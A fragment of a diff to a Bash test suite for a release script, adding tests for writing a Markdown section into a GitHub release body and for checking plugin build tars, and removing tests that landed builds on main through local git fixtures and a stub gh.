+check "a section at the end of the body: replaced, the lead kept" \
+  "$(is "$rc|$(edited_is 'Lead sentence.' '## Changelog' "$entries")" '0|true')"
+printf 'Lead sentence.\n\n## Changelog\n\n- an older entry\n\n# Notes\n\nTail sentence.\n' > "$work/body.md"
+section_run '## Changelog' "$entries"
+check "a section followed by a heading of level one: that heading and what follows it survive" \
+  "$(is "$rc|$(edited_is "$(printf 'Lead sentence.\n\n# Notes\n\nTail sentence.')" '## Changelog' "$entries")" '0|true')"
+# The worker-image caller's shape: one line of content on standard input, under its own heading.
+printf 'Pkg v1.0.1, built from the tag.\n' > "$work/body.md"
+# shellcheck disable=SC2016 # literal Markdown backticks, no expansion wanted
+printf '`%s`\n' 'ghcr.io/example/worker@sha256:b2' > "$work/section-stdin.md"
+section_run '## Worker image' -
+check "content on standard input: written under that heading" \
+  "$(is "$rc|$(edited_is 'Pkg v1.0.1, built from the tag.' '## Worker image' "$work/section-stdin.md")" '0|true')"
+# A content that is empty or missing, on either route: refused before the body is even read, so
+# the caller's step fails instead of leaving a heading over nothing.
+: > "$work/section-empty.md"
+: > "$work/section-stdin.md"
+section_run '## Changelog' "$work/section-empty.md"
+check "an empty content file: exits 1, calling no gh" "$(is "$rc|$calls|$edited" '1||')"
+check "an empty content file: the error names the file" \
+  "$([[ $out == *"::error::release-push.sh release-section: nothing to write into the ## Changelog section of release pkg-v1.0.1: $work/section-empty.md holds no content"* ]] && echo true || echo false)"
+section_run '## Changelog' "$work/section-missing.md"
+check "a content file that is not there: exits 1, calling no gh, naming the file" \
+  "$(is "$rc|$calls|$([[ $out == *"$work/section-missing.md holds no content"* ]] && echo true || echo false)" '1||true')"
+section_run '## Worker image' -
+check "empty standard input: exits 1, calling no gh, naming it" \
+  "$(is "$rc|$calls|$([[ $out == *"release pkg-v1.0.1: standard input holds no content"* ]] && echo true || echo false)" '1||true')"
+# A heading that is no level-two heading line: refused, since the awk that finds the section again
+# would find nothing and a re-run would add a second copy.
+for heading in '### Changelog' '# Changelog' 'Changelog' '## ' '## Changelog ' '##Changelog'; do
+  printf -v shown '%q' "$heading"
+  section_run "$heading" "$entries"
+  check "a heading that is no level-two heading line ($shown): exits 2, calling no gh" "$(is "$rc|$calls|$edited" '2||')"
+  check "a heading that is no level-two heading line ($shown): the error names it" \
+    "$([[ $out == *"the heading $shown is not a level-two heading line ('## ' and a title); refusing it"* ]] && echo true || echo false)"
+done
+section_run '## Changelog'
+check "a missing argument: exits 2, calling no gh, naming what is needed" \
+  "$(is "$rc|$calls|$(contains "$out" 'a tag, a heading and a content file are needed; usage: release-push\.sh release-section <tag> <heading> <content-file>$')" '2||true')"
+
+echo
+echo "Case: release.yaml's worker_image_release names the image on the release from a checkout"
+# That job's last step runs release-push.sh out of the checkout, and the job made none until this
+# change, so the step exited 127 on every legion release and the release body never got its
+# "## Worker image" section. The step's `run:` is read out of the workflow by name and run twice
+# against the stub gh above: in a directory holding no checkout, as the job was, and in one
+# holding the script where the step names it, as the job's checkout leaves it. That the job has
+# the checkout is check-release-credentials.sh's rule 6, not a text match here.
+workflow="$script_dir/../workflows/release.yaml"
+# workflow_step_run <job> <step name>: the body of that step's `run:` block in the workflow,
+# dedented, so the case runs the workflow's own code.
+workflow_step_run() {
+  awk -v job="  $1:" -v name="      - name: $2" '
+    $0 == job { in_job = 1; next }
+    in_job && /^  [A-Za-z_]+:/ { in_job = 0 }
+    in_job && $0 == name { step = 1; next }
+    step && /^      - / { exit }
+    step && $0 == "        run: |" { body = 1; next }
+    body && $0 != "" && $0 !~ /^          / { exit }
+    body { sub(/^          /, ""); print }
+  ' "$workflow"
+}
+name_step=$(workflow_step_run worker_image_release "Name the worker image on the legion release")
+check "that job's last step runs release-section over the worker image reference" \
+  "$(contains "$name_step" 'release-push\.sh release-section "\$RELEASE_TAG" .## Worker image. -')"
+ref='ghcr.io/example/repo/worker@sha256:1111111111111111111111111111111111111111111111111111111111111111'
+printf 'Generated notes\n' > "$work/body.md"
+# run_name_step <dir>: that step's body in <dir>, under the shell GitHub runs a `run:` with and
+# with the environment worker_image_release gives it; leaves rc, out (combined) and the stub's
+# call log in calls.
+run_name_step() {
+  : > "$work/calls"
+  rm -f "$work/edited.md"
+  set +e
+  out=$(cd "$1" && env GITHUB_REPOSITORY=example/repo GH_TEST_DIR="$work" GH_TEST_RELEASE=published \
+    GH_TEST_FAIL='' GH_TOKEN=token REF="$ref" RELEASE_TAG=legion-v1.2.3 PATH="$work/bin:$PATH" \
+    bash -e -o pipefail -c "$name_step" 2>&1)
+  rc=$?
+  set -e
+  calls=$(<"$work/calls")
+}
+mkdir -p "$work/wir-bare" "$work/wir-checkout/.github/scripts"
+ln -sf "$release_push" "$work/wir-checkout/.github/scripts/release-push.sh"
+run_name_step "$work/wir-bare"
+check "with no checkout: the step exits 127, having called no gh, as every legion release did" \
+  "$(is "$rc|$calls|$(contains "$out" 'release-push\.sh: No such file or directory')" "127||true")"
+run_name_step "$work/wir-checkout"
+# The notes file release-section hands gh is its own temporary one, so the last argument of the
+# edit call is cut away before the two calls are compared.
+check "with the checkout: the step exits 0, viewing the body and editing it once" \
+  "$(is "$rc|$(wc -l <<<"$calls")|$(sed -n 1p <<<"$calls")|$(sed -n '2s/\[[^]]*\]$//p' <<<"$calls")" \
+    "0|2|$(argv release view legion-v1.2.3 --repo example/repo --json body -q .body)|$(argv release edit legion-v1.2.3 --repo example/repo --notes-file)")"
+check "with the checkout: the body keeps its notes and gets the digest under ## Worker image" \
+  "$(is "$(<"$work/edited.md")" "$(printf 'Generated notes\n\n## Worker image\n\n`%s`' "$ref")")"
 
 echo
 echo "Case 11b: restart leaves the release to a later unfinished run that holds this commit, else starts one"
@@ -1545,23 +1230,14 @@ check "no GITHUB_REPOSITORY: exits non-zero, with an ::error:: naming it, making
   "$([ "$rc" != 0 ] && is "$(contains "$out" '^::error::release-push.sh push-tag: GITHUB_REPOSITORY')|$left" 'true|0' || echo false)"
 
 echo
-echo "Case: push-built lands a changed build of the Claude Envoy plugin on main, on main's tip when main moved, and refuses a doctored one"
-# Each case builds a bare origin whose main holds two commits and a clone of it detached at main's
-# tip, as the push job checks out the commit its build job built from. The first commit holds a
-# README, the real build input list (packages/claude-envoy/scripts/build-inputs.txt, copied from
-# this repository), a source file of the plugin (packages/claude-envoy/src/channel.ts) and a
-# changelog the list excludes (packages/contracts/CHANGELOG.md); the second, main's built files
-# under packages/claude-envoy/dist and packages/claude-envoy/legion, as an ordinary commit by a
-# person, as a pull request's own committed build is. A case then moves origin's main as merges do
-# while the push job waits. The tar is made as the build job makes it (`tar -cf … -C <dir> dist
-# legion`), from a tree each case fills and may doctor. push-built reaches origin as push-tag does,
-# through the deploy key and the GitHub URL rewritten to the local origin, and starts runs through
-# the restart cases' stub gh, which logs every call. A `git` wrapper first on PATH plays a merge
-# landing between push-built's fetch and its push.
-pb="$work/pb"
-mkdir -p "$pb/trees"
-inputs_list="$script_dir/../../packages/claude-envoy/scripts/build-inputs.txt"
-bot='github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>'
+echo "Case: check-built accepts a build of the Claude Envoy plugin and refuses what no build holds, writing nothing"
+# The tars are made as a build job makes them (`tar -cf … -C <tree> dist legion`), from a tree
+# each case fills and may doctor. Each run is from an empty directory outside any repository,
+# with an empty TMPDIR, and the tars' directory is compared before and after: check-built needs
+# no checkout, no credential and no network, and writes nothing.
+pb="$work/built"
+tars="$pb/trees"
+mkdir -p "$tars"
 # plugin_tree <dir> <marker>: the files a build of the plugin holds, under <dir>/dist and
 # <dir>/legion, each naming itself and <marker>.
 plugin_tree() {
@@ -1573,55 +1249,11 @@ plugin_tree() {
     printf '%s %s\n' "$file" "$marker" > "$dir/$file"
   done
 }
-# built_setup <dir> [--no-list]: origin.git, its seed repository and clone a under <dir> (above);
-# --no-list leaves the build input list out. Main's built files carry the marker seed. Leaves
-# main's first commit in first and its tip, the clone's HEAD, in base.
-built_setup() {
-  local dir=$1 list=${2:-}
-  mkdir -p "$dir/seed/packages/claude-envoy/scripts" "$dir/seed/packages/claude-envoy/src" "$dir/seed/packages/contracts"
-  git init -q -b main "$dir/seed"
-  identity "$dir/seed"
-  printf 'seed line\n' > "$dir/seed/README.md"
-  [ "$list" = --no-list ] || cp "$inputs_list" "$dir/seed/packages/claude-envoy/scripts/build-inputs.txt"
-  printf 'export const channel = 1;\n' > "$dir/seed/packages/claude-envoy/src/channel.ts"
-  printf '# Changelog\n' > "$dir/seed/packages/contracts/CHANGELOG.md"
-  git -C "$dir/seed" add -A
-  git -C "$dir/seed" commit -q -m "seed"
-  first=$(git -C "$dir/seed" rev-parse HEAD)
-  plugin_tree "$dir/seed/packages/claude-envoy" seed
-  git -C "$dir/seed" add -A
-  git -C "$dir/seed" commit -q -m "feat(claude-envoy): the built plugin"
-  base=$(git -C "$dir/seed" rev-parse HEAD)
-  git clone -q --bare "$dir/seed" "$dir/origin.git"
-  git clone -q "$dir/origin.git" "$dir/a"
-  git -C "$dir/a" checkout -q --detach
-}
-# move_main <dir> <subject>: commit whatever the case changed in <dir>'s seed (nothing makes an
-# empty commit) with <subject>, as a merge landing after the build started, and push it to origin's
-# main; leaves it in moved.
-move_main() {
-  git -C "$1/seed" add -A
-  git -C "$1/seed" commit -q --allow-empty -m "$2"
-  git -C "$1/seed" push -q "$1/origin.git" main
-  moved=$(git -C "$1/seed" rev-parse HEAD)
-}
-# bot_rebuild <dir> <marker> <named>: a commit on <dir>'s seed by github-actions[bot] that rewrites
-# main's built files with <marker>, with push-built's subject naming <named>, pushed to origin's
-# main; leaves it in rebuilt.
-bot_rebuild() {
-  plugin_tree "$1/seed/packages/claude-envoy" "$2"
-  git -C "$1/seed" add -A
-  GIT_AUTHOR_NAME='github-actions[bot]' GIT_AUTHOR_EMAIL='41898282+github-actions[bot]@users.noreply.github.com' \
-    GIT_COMMITTER_NAME='github-actions[bot]' GIT_COMMITTER_EMAIL='41898282+github-actions[bot]@users.noreply.github.com' \
-    git -C "$1/seed" commit -q -m "chore(claude-envoy): rebuild dist/ and legion/ from ${3:0:12} [skip ci]"
-  git -C "$1/seed" push -q "$1/origin.git" main
-  rebuilt=$(git -C "$1/seed" rev-parse HEAD)
-}
-# built_tar <name> <marker> [<mutation> [<tar argument>...]]: $pb/trees/<name>.tar, from a tree
+# built_tar <name> <marker> [<mutation> [<tar argument>...]]: $tars/<name>.tar, from a tree
 # plugin_tree fills with <marker>, the shell text <mutation> then run in it, packed with the tar
 # arguments (default: dist legion) after `-C <tree>`.
 built_tar() {
-  local name=$1 marker=$2 mutation=${3:-} dir="$pb/trees/$1"
+  local name=$1 marker=$2 mutation=${3:-} dir="$tars/$1"
   shift 2
   [ $# -eq 0 ] || shift
   [ $# -gt 0 ] || set -- dist legion
@@ -1630,471 +1262,6 @@ built_tar() {
   [ -z "$mutation" ] || (cd "$dir" && eval "$mutation")
   tar -cf "$dir.tar" -C "$dir" "$@" 2>/dev/null
 }
-# push_built <clone> <base> <tar> [VAR=value...]: runs `release-push.sh push-built <base> <tar>`
-# from <clone>, or from $PB_SUBDIR under it when that is set, with the deploy key, a fresh TMPDIR,
-# the GitHub URL rewritten to <clone>/../origin.git and the stub gh first on PATH; leaves its exit
-# code in rc, its combined output in out, the stub's call log in calls and what TMPDIR holds
-# afterwards in left.
-PB_SUBDIR=''
-push_built() {
-  local clone=$1 base=$2 tar=$3 dir
-  dir=$(dirname "$clone")
-  shift 3
-  rm -rf "$dir/tmp" && mkdir "$dir/tmp"
-  : > "$dir/calls"
-  set +e
-  out=$(cd "$clone${PB_SUBDIR:+/$PB_SUBDIR}" && env TMPDIR="$dir/tmp" GITHUB_REPOSITORY=example/repo \
-    DEPLOY_KEY="$(<"$work/deploy")" GIT_CONFIG_COUNT=1 \
-    GIT_CONFIG_KEY_0="url.$dir/origin.git.insteadOf" GIT_CONFIG_VALUE_0="git@github.com:example/repo.git" \
-    GH_TEST_DIR="$dir" GH_TEST_FAIL='' GH_TEST_QUIET='' GH_TEST_LAND='' PATH="$work/restart-bin:$PATH" \
-    "$@" "$release_push" push-built "$base" "$tar" 2>&1)
-  rc=$?
-  set -e
-  calls=$(<"$dir/calls")
-  left=$(find "$dir/tmp" -mindepth 1 | wc -l)
-}
-rebuild_run=$(argv workflow run claude-envoy-rebuild.yaml --repo example/repo --ref main)
-fresh_url='https://github\.com/example/repo/actions/runs/7'
-# built_files <origin.git> <rev>: each file under the two directories at <rev>, its blob's hash and
-# its path, sorted by path.
-built_files() {
-  git -C "$1" ls-tree -r "$2" -- packages/claude-envoy/dist packages/claude-envoy/legion |
-    awk -F '\t' '{ split($1, f, " "); print f[3] " " $2 }' | LC_ALL=C sort -k2
-}
-# tree_files <tree>: the same for the files of a tar's tree under $pb/trees.
-tree_files() {
-  (cd "$1" && find dist legion -type f | while IFS= read -r file; do
-    printf '%s packages/claude-envoy/%s\n' "$(git hash-object "$file")" "$file"
-  done | LC_ALL=C sort -k2)
-}
-# built_landed <description> <dir> <tree> <onto> <onto-name>: origin's main under <dir> is exactly
-# one commit on <onto> (named <onto-name> in the check) whose one parent is <onto>, changing only
-# paths under dist/ and legion/, its two directories exactly <tree>'s files with their bytes, by
-# github-actions[bot] with the subject naming $base; nothing is left in TMPDIR.
-built_landed() {
-  local what=$1 o="$2/origin.git" tree=$3 onto=$4 tip
-  tip=$(git -C "$o" rev-parse main)
-  check "$what: lands as exactly one commit whose one parent is $5" \
-    "$(is "$(git -C "$o" rev-list --count "$onto..main")|$(git -C "$o" rev-list --parents -n 1 main)" "1|$tip $onto")"
-  check "$what: the commit changes only paths under dist/ and legion/" \
-    "$(is "$(git -C "$o" diff --name-only "$onto" main | grep -cv '^packages/claude-envoy/\(dist\|legion\)/')" 0)"
-  check "$what: main's two directories hold exactly the tar's files, with its bytes" \
-    "$(is "$(built_files "$o" main)" "$(tree_files "$tree")")"
-  check "$what: authored and committed by github-actions[bot], the subject naming the base, with the skip keyword" \
-    "$(is "$(git -C "$o" log -1 --format='%an <%ae>|%cn <%ce>|%B' main)" \
-      "$bot|$bot|chore(claude-envoy): rebuild dist/ and legion/ from ${base:0:12} [skip ci]")"
-  check "$what: nothing is left in TMPDIR" "$(is "$left" 0)"
-}
-# landing_notice <onto>: the regex of the notice push-built gives when main moved to <onto>, the
-# commit it lands being origin's main ($landed_commit).
-landing_notice() {
-  printf '%s' "^::notice title=Landing on main's tip::built from $base, landing on $1, main's tip, as $landed_commit, which changes only packages/claude-envoy/dist and packages/claude-envoy/legion: main moved since the build started$"
-}
-# fresh_notice <paths>: the regex of the notice push-built gives when it started a fresh run after
-# landing $landed_commit on $moved, <paths> (a regex) being the changed inputs it names.
-fresh_notice() {
-  printf '%s' "^::notice title=A fresh run started::the build landed on main as $landed_commit, but build inputs changed between $base and $moved: $1, so a fresh run of claude-envoy-rebuild\.yaml on main, $fresh_url, builds main's tip$"
-}
-
-built_setup "$pb/land"
-built_tar land rebuilt 'rm legion/agents/deep-worker.md && mkdir legion/skills/new-skill && printf "new\n" > legion/skills/new-skill/SKILL.md'
-push_built "$pb/land/a" "$base" "$pb/trees/land.tar"
-check "a changed build: exits 0, calling no gh" "$(is "$rc|$calls" "0|")"
-built_landed "a changed build" "$pb/land" "$pb/trees/land" "$base" "the base"
-check "a changed build: a file the tar lacks is deleted" \
-  "$(git -C "$pb/land/origin.git" cat-file -e main:packages/claude-envoy/legion/agents/deep-worker.md 2>/dev/null && echo false || echo true)"
-check "a changed build: README.md and the plugin's source are untouched" \
-  "$(is "$(git -C "$pb/land/origin.git" diff --name-only "$base" main -- README.md packages/claude-envoy/src packages/claude-envoy/scripts)" "")"
-check "a changed build on an unmoved main: no Landing on main's tip notice" "$(is "$(contains "$out" 'Landing on main')" false)"
-
-built_setup "$pb/same"
-built_tar same seed
-push_built "$pb/same/a" "$base" "$pb/trees/same.tar"
-check "an identical build: exits 0, calling no gh" "$(is "$rc|$calls|$left" "0||0")"
-check "an identical build: a notice says main already matches" "$(contains "$out" "^::notice title=Nothing to push::main.s packages/claude-envoy/dist and packages/claude-envoy/legion at $base already match this build$")"
-check "an identical build: pushes nothing, leaves the clone clean" \
-  "$(is "$(git -C "$pb/same/origin.git" rev-parse main)|$(git -C "$pb/same/a" rev-parse HEAD)|$(git -C "$pb/same/a" status --porcelain)" "$base|$base|")"
-
-# Main moved by commits that change no build input: the build lands on main's tip, starting no run.
-built_setup "$pb/moved"
-# The hook goes in after move_main's seed push, which runs without PUSH_SEEN set and would fire it
-# with nowhere to write.
-move_main "$pb/moved" "fix: an empty merge landing after the build started"
-record_hook "$pb/moved/origin.git"
-built_tar moved rebuilt
-: > "$pb/moved/seen"
-push_built "$pb/moved/a" "$base" "$pb/trees/moved.tar" PUSH_SEEN="$pb/moved/seen"
-landed_commit=$(git -C "$pb/moved/origin.git" rev-parse main)
-check "main moved by an empty commit: exits 0, calling no gh" "$(is "$rc|$calls" "0|")"
-built_landed "main moved by an empty commit" "$pb/moved" "$pb/trees/moved" "$moved" "main's moved tip"
-check "main moved by an empty commit: the notice names the base, the tip and the commit" "$(contains "$out" "$(landing_notice "$moved")")"
-check "main moved by an empty commit: one key directory for both fetches, and no temporary index left, while the push ran" \
-  "$(is "$(<"$pb/moved/seen")" "600 key"$'\n'"600 known_hosts")"
-
-built_setup "$pb/docs"
-mkdir -p "$pb/docs/seed/docs"
-printf 'notes\n' > "$pb/docs/seed/docs/notes.md"
-move_main "$pb/docs" "docs: notes landing after the build started"
-built_tar docs rebuilt
-push_built "$pb/docs/a" "$base" "$pb/trees/docs.tar"
-landed_commit=$(git -C "$pb/docs/origin.git" rev-parse main)
-what="main moved by a docs-only commit, no rebuild commit on main (its build is a person's ordinary commit)"
-check "$what: exits 0, calling no gh" "$(is "$rc|$calls" "0|")"
-built_landed "$what" "$pb/docs" "$pb/trees/docs" "$moved" "main's moved tip"
-check "$what: main keeps docs/notes.md and README.md" \
-  "$(is "$(git -C "$pb/docs/origin.git" show main:docs/notes.md)|$(git -C "$pb/docs/origin.git" show main:README.md)" 'notes|seed line')"
-check "$what: the notice names the base, the tip and the commit" "$(contains "$out" "$(landing_notice "$moved")")"
-check "$what: no fresh run notice" "$(is "$(contains "$out" 'A fresh run started')" false)"
-
-built_setup "$pb/excluded"
-printf -- '- a note\n' >> "$pb/excluded/seed/packages/contracts/CHANGELOG.md"
-move_main "$pb/excluded" "docs(contracts): a changelog line"
-built_tar excluded rebuilt
-push_built "$pb/excluded/a" "$base" "$pb/trees/excluded.tar"
-landed_commit=$(git -C "$pb/excluded/origin.git" rev-parse main)
-what="main moved by a commit to packages/contracts/CHANGELOG.md, which the list excludes inside an input directory"
-check "$what: exits 0, calling no gh" "$(is "$rc|$calls" "0|")"
-built_landed "$what" "$pb/excluded" "$pb/trees/excluded" "$moved" "main's moved tip"
-
-# Main moved by a build input: the build still lands on the tip, and one fresh run is started.
-built_setup "$pb/input"
-printf 'export const reconnect = true;\n' >> "$pb/input/seed/packages/claude-envoy/src/channel.ts"
-move_main "$pb/input" "fix(claude-envoy): reconnect"
-built_tar input rebuilt
-push_built "$pb/input/a" "$base" "$pb/trees/input.tar"
-landed_commit=$(git -C "$pb/input/origin.git" rev-parse main)
-what="main moved by a commit to packages/claude-envoy/src/channel.ts"
-check "$what: exits 0, starting exactly one fresh run of the workflow on main" "$(is "$rc|$calls" "0|$rebuild_run")"
-built_landed "$what" "$pb/input" "$pb/trees/input" "$moved" "main's moved tip"
-check "$what: the landing notice names the base, the tip and the commit" "$(contains "$out" "$(landing_notice "$moved")")"
-check "$what: the fresh run's notice names the changed input and the run" \
-  "$(contains "$out" "$(fresh_notice 'packages/claude-envoy/src/channel\.ts')")"
-
-built_setup "$pb/rename"
-mkdir -p "$pb/rename/seed/docs"
-git -C "$pb/rename/seed" mv packages/claude-envoy/src/channel.ts docs/channel.ts
-move_main "$pb/rename" "docs: move channel.ts out of the plugin"
-built_tar rename rebuilt
-push_built "$pb/rename/a" "$base" "$pb/trees/rename.tar"
-landed_commit=$(git -C "$pb/rename/origin.git" rev-parse main)
-what="main moved by renaming packages/claude-envoy/src/channel.ts to docs/channel.ts"
-check "$what: exits 0, starting exactly one fresh run" "$(is "$rc|$calls" "0|$rebuild_run")"
-built_landed "$what" "$pb/rename" "$pb/trees/rename" "$moved" "main's moved tip"
-check "$what: the fresh run's notice names the old path" \
-  "$(contains "$out" "$(fresh_notice 'packages/claude-envoy/src/channel\.ts')")"
-
-# git diff limits the paths before it pairs renames, so the rename out of the plugin above lists
-# the old path with or without --no-renames; a rename inside the inputs shows the difference.
-built_setup "$pb/rename-inside"
-git -C "$pb/rename-inside/seed" mv packages/claude-envoy/src/channel.ts packages/claude-envoy/src/transport.ts
-move_main "$pb/rename-inside" "refactor(claude-envoy): channel.ts becomes transport.ts"
-built_tar rename-inside rebuilt
-push_built "$pb/rename-inside/a" "$base" "$pb/trees/rename-inside.tar"
-landed_commit=$(git -C "$pb/rename-inside/origin.git" rev-parse main)
-what="main moved by renaming packages/claude-envoy/src/channel.ts to packages/claude-envoy/src/transport.ts"
-check "$what: exits 0, starting exactly one fresh run" "$(is "$rc|$calls" "0|$rebuild_run")"
-check "$what: the fresh run's notice names the old path and the new one (git diff --no-renames)" \
-  "$(contains "$out" "$(fresh_notice 'packages/claude-envoy/src/channel\.ts packages/claude-envoy/src/transport\.ts')")"
-
-built_setup "$pb/list"
-printf '# a note on the list\n' >> "$pb/list/seed/packages/claude-envoy/scripts/build-inputs.txt"
-move_main "$pb/list" "docs(claude-envoy): a note on the build input list"
-built_tar list rebuilt
-push_built "$pb/list/a" "$base" "$pb/trees/list.tar"
-landed_commit=$(git -C "$pb/list/origin.git" rev-parse main)
-what="main moved by a commit changing only the build input list"
-check "$what: exits 0, starting exactly one fresh run" "$(is "$rc|$calls" "0|$rebuild_run")"
-built_landed "$what" "$pb/list" "$pb/trees/list" "$moved" "main's moved tip"
-check "$what: the fresh run's notice names the list" \
-  "$(contains "$out" "$(fresh_notice 'packages/claude-envoy/scripts/build-inputs\.txt')")"
-
-built_setup "$pb/nolist" --no-list
-mkdir -p "$pb/nolist/seed/docs"
-printf 'notes\n' > "$pb/nolist/seed/docs/notes.md"
-move_main "$pb/nolist" "docs: notes landing after the build started"
-built_tar nolist rebuilt
-push_built "$pb/nolist/a" "$base" "$pb/trees/nolist.tar"
-landed_commit=$(git -C "$pb/nolist/origin.git" rev-parse main)
-what="a base without the build input list, main moved by a docs-only commit"
-check "$what: exits 0, starting exactly one fresh run" "$(is "$rc|$calls" "0|$rebuild_run")"
-built_landed "$what" "$pb/nolist" "$pb/trees/nolist" "$moved" "main's moved tip"
-check "$what: a ::warning names the list file" \
-  "$(contains "$out" "^::warning title=No build input list::$base holds no pathspec in packages/claude-envoy/scripts/build-inputs\.txt, the list of the build's inputs, so every change since it counts as a build input$")"
-check "$what: the fresh run's notice says why" \
-  "$(contains "$out" "^::notice title=A fresh run started::the build landed on main as $landed_commit, but $base holds no pathspec in packages/claude-envoy/scripts/build-inputs\.txt, .*, so a fresh run of claude-envoy-rebuild\.yaml on main, $fresh_url, builds main's tip$")"
-
-built_setup "$pb/ghfail"
-printf 'export const reconnect = true;\n' >> "$pb/ghfail/seed/packages/claude-envoy/src/channel.ts"
-move_main "$pb/ghfail" "fix(claude-envoy): reconnect"
-built_tar ghfail rebuilt
-push_built "$pb/ghfail/a" "$base" "$pb/trees/ghfail.tar" GH_TEST_FAIL=run
-landed_commit=$(git -C "$pb/ghfail/origin.git" rev-parse main)
-what="gh workflow run fails after a landing with a changed input"
-check "$what: exits 1, after one attempt to start a run" "$(is "$rc|$calls" "1|$rebuild_run")"
-check "$what: origin's main holds the landed commit, on the moved tip" \
-  "$(is "$(git -C "$pb/ghfail/origin.git" rev-list --parents -n 1 main)|$left" "$landed_commit $moved|0")"
-check "$what: the error says the build landed and names the command a person runs" \
-  "$(contains "$out" "^::error::release-push\.sh push-built: the build already landed on main as $landed_commit, but build inputs changed between $base and $moved: packages/claude-envoy/src/channel\.ts, so main's build is one run behind its inputs, and starting a fresh run of claude-envoy-rebuild\.yaml on main failed; start one by hand: gh workflow run claude-envoy-rebuild\.yaml --repo example/repo --ref main$")"
-
-# Main already holds a build of a commit the base does not descend from: nothing lands, no run.
-built_setup "$pb/newer"
-printf 'notes\n' > "$pb/newer/seed/notes.md"
-move_main "$pb/newer" "docs: a merge after the base"
-newer_base=$moved
-bot_rebuild "$pb/newer" newer "$newer_base"
-built_tar newer rebuilt
-push_built "$pb/newer/a" "$base" "$pb/trees/newer.tar"
-what="main already holds github-actions[bot]'s rebuild of a commit after the base"
-check "$what: exits 0, pushing nothing, calling no gh, leaving nothing in TMPDIR" \
-  "$(is "$rc|$(git -C "$pb/newer/origin.git" rev-parse main)|$calls|$left" "0|$rebuilt||0")"
-check "$what: the notice names the commit main's build was made from" \
-  "$(contains "$out" "^::notice title=Nothing pushed; main holds a newer build::main already holds a build of $newer_base, newer than $base, the commit this build was made from, so nothing was pushed and no run was started$")"
-
-# Run from a subdirectory of the clone, as a job that moved into the package would: push-built
-# moves to the repository's root before it reads any repository path, so main's build is still
-# found and the newer-build rule still refuses, and a tar named relative to that subdirectory still
-# resolves from there.
-built_setup "$pb/subdir-newer"
-printf 'notes\n' > "$pb/subdir-newer/seed/notes.md"
-move_main "$pb/subdir-newer" "docs: a merge after the base"
-newer_base=$moved
-bot_rebuild "$pb/subdir-newer" newer "$newer_base"
-built_tar subdir-newer rebuilt
-PB_SUBDIR=packages/claude-envoy
-push_built "$pb/subdir-newer/a" "$base" "$pb/trees/subdir-newer.tar"
-PB_SUBDIR=''
-what="run from packages/claude-envoy, main holding a newer build"
-check "$what: exits 0, pushing nothing, calling no gh, leaving nothing in TMPDIR" \
-  "$(is "$rc|$(git -C "$pb/subdir-newer/origin.git" rev-parse main)|$calls|$left" "0|$rebuilt||0")"
-check "$what: the notice names the commit main's build was made from" \
-  "$(contains "$out" "^::notice title=Nothing pushed; main holds a newer build::main already holds a build of $newer_base, newer than $base, the commit this build was made from, so nothing was pushed and no run was started$")"
-
-built_setup "$pb/subdir-land"
-built_tar subdir-land rebuilt
-PB_SUBDIR=packages/claude-envoy
-# Four levels up from <clone>/packages/claude-envoy is $pb, which holds trees/.
-push_built "$pb/subdir-land/a" "$base" ../../../../trees/subdir-land.tar
-PB_SUBDIR=''
-what="run from packages/claude-envoy with a relative tar path"
-check "$what: exits 0, calling no gh" "$(is "$rc|$calls" "0|")"
-built_landed "$what" "$pb/subdir-land" "$pb/trees/subdir-land" "$base" "the base"
-
-built_setup "$pb/forged"
-printf 'notes\n' > "$pb/forged/seed/notes.md"
-move_main "$pb/forged" "docs: a merge after the base"
-plugin_tree "$pb/forged/seed/packages/claude-envoy" forged
-git -C "$pb/forged/seed" add -A
-git -C "$pb/forged/seed" commit -q -m "chore(claude-envoy): rebuild dist/ and legion/ from ${base:0:12} [skip ci]"
-git -C "$pb/forged/seed" push -q "$pb/forged/origin.git" main
-forged=$(git -C "$pb/forged/seed" rev-parse HEAD)
-built_tar forged rebuilt
-push_built "$pb/forged/a" "$base" "$pb/trees/forged.tar"
-what="main's newest build is a person's commit with the rebuild subject naming the base"
-check "$what: read as a build of that commit itself, newer than the base: nothing pushed, no gh call" \
-  "$(is "$rc|$(git -C "$pb/forged/origin.git" rev-parse main)|$calls|$left" "0|$forged||0")"
-check "$what: the notice names that commit, not the base" \
-  "$(contains "$out" "^::notice title=Nothing pushed; main holds a newer build::main already holds a build of $forged, newer than $base, ")"
-
-built_setup "$pb/equal"
-bot_rebuild "$pb/equal" rebuilt "$base"
-built_tar equal rebuilt
-push_built "$pb/equal/a" "$base" "$pb/trees/equal.tar"
-what="main already holds github-actions[bot]'s rebuild of the base itself, with this build's bytes"
-check "$what: exits 0, pushing nothing, calling no gh, leaving nothing in TMPDIR" \
-  "$(is "$rc|$(git -C "$pb/equal/origin.git" rev-parse main)|$calls|$left" "0|$rebuilt||0")"
-check "$what: the notice says main's tip already matches" \
-  "$(contains "$out" "^::notice title=Nothing to push::main.s packages/claude-envoy/dist and packages/claude-envoy/legion at $rebuilt already match this build$")"
-
-built_setup "$pb/equal-input"
-bot_rebuild "$pb/equal-input" rebuilt "$base"
-printf 'export const reconnect = true;\n' >> "$pb/equal-input/seed/packages/claude-envoy/src/channel.ts"
-move_main "$pb/equal-input" "fix(claude-envoy): reconnect"
-built_tar equal-input rebuilt
-push_built "$pb/equal-input/a" "$base" "$pb/trees/equal-input.tar"
-what="main already holds this build, and an input changed after it"
-check "$what: exits 0, pushing nothing, starting exactly one fresh run" \
-  "$(is "$rc|$(git -C "$pb/equal-input/origin.git" rev-parse main)|$calls|$left" "0|$moved|$rebuild_run|0")"
-check "$what: the notices say nothing to push and name the changed input and the run" \
-  "$(is "$(contains "$out" "^::notice title=Nothing to push::.* at $moved already match this build$")|$(contains "$out" "^::notice title=A fresh run started::build inputs changed between $base and $moved: packages/claude-envoy/src/channel\.ts, so a fresh run of claude-envoy-rebuild\.yaml on main, $fresh_url, builds main's tip$")" 'true|true')"
-
-# Main rewritten, so its tip does not descend from the base: nothing lands, one fresh run.
-built_setup "$pb/rewritten"
-sibling=$(git -C "$pb/rewritten/seed" commit-tree -p "$first" -m "fix: main rewritten" "$first^{tree}")
-git -C "$pb/rewritten/seed" push -q "$pb/rewritten/origin.git" "+$sibling:refs/heads/main"
-built_tar rewritten rebuilt
-push_built "$pb/rewritten/a" "$base" "$pb/trees/rewritten.tar"
-what="main rewritten to a sibling of the base"
-check "$what: exits 0, pushing nothing, starting exactly one fresh run, leaving nothing in TMPDIR" \
-  "$(is "$rc|$(git -C "$pb/rewritten/origin.git" rev-parse main)|$calls|$left" "0|$sibling|$rebuild_run|0")"
